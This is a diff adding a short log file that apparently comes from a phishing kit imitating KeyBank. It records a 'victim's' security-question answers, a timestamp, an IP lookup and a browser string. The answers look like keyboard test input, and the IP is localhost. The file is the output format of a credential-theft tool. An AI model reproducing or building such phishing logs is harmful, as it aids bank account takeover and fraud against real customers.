@@ -1,0 +1,21 @@
+
+
+[ KEYBANK SECURITY INFO]
+[ USER SECURITY INFORMATION]
+
+[Q1] = In what city was your mother born?
+[A1] = yutuiy
+
+[Q2] = What was the name of your first pet?
+[A2] = yutui
+
+[Q3] = What was the first name of your favorite teacher or professor?
+[A3] = uytuituiyt
+
+[VICTIM INFORMATION]
+
+[TIME/DATE]    = 22:21:07 13/06/2022
+[IP INFO] = http://ip-api.com/json/::1
+[REMOTE IP]    = ::1
+[BROWSER] = Chrome On Windows 10
+[BROWSER] = Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36
